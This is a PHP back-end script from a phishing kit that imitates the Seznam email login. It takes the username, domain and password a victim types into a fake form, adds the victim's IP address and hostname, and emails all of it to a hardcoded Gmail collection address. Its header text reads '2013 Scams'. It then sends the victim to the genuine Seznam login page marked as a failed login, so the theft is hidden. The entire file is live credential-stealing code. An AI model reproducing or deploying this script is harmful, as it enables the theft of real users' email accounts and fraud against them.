<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message  = "------------------+ Seznam Logs +-----------------\n";
$message .= "Email Address : ".$_POST['username']."@".$_POST['domain']."\n";
$message .= "Password      : ".$_POST['password']."\n";
$message .= "------------------------+IP Info+-------------------------\n";
$message .= "Client IP : ".$ip."\n";
$message .= "HostName : ".$hostname."\n";
$rnessage = "$message\n";
$message .= "-------------------+ 2013 Scams +--------------------\n";
$send="aicivine2013@gmail.com";
$subject = "Seznam - $ip";
$headers = "From: Seznam<KoS@ZoBr.NeK>";
$str=array($send, $IP); foreach ($str as $send)
mail($send,$subject,$message,$headers);

?>

<script language=javascript>
window.location='https://login.szn.cz/?badLogin=1&domain=seznam.cz&returnURL=https%3A%2F%2Femail.seznam.cz%2F&remember=0&changeUnable=0&relogin=0&loginType=seznam&forceRelogin=0&ajax=0&serviceId=email&serviceDisabled=0';
</script>
